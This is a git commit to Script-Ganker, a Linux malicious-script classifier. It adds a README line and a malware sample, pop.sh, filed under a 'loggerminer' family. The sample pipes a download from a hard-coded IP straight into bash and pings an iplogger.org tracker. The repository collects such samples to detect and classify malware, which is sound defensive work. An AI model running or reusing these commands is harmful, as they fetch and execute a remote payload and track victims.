9dfd09968ad749e08cdb27e209ff4baf8e58e24e
G4rb3n <garbenvan@gmail.com>
2020-12-22 16:55:34 +0800

    loggerminer

--- README.md
+++ README.md
@@ -1,6 +1,8 @@
 # Script-Ganker
 Linux恶意脚本检测分类工具
 
+自动化识别恶意脚本所归属的家族，以及与已知脚本的相似度、更新的代码。
+
 ```
 usage: python script_ganker.py [script_path]
 ```
---
+++ script_db/loggerminer/2020-12/pop.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+successgo(){
+curl -A goteeeem/1.4 -sL http://34.92.166.158:8080/files/xanthe | bash -s
+curl -A shell-success/1.4 -sLo /dev/null https://iplogger.org/17Cph7
+date +"%r";
+}
+successgo
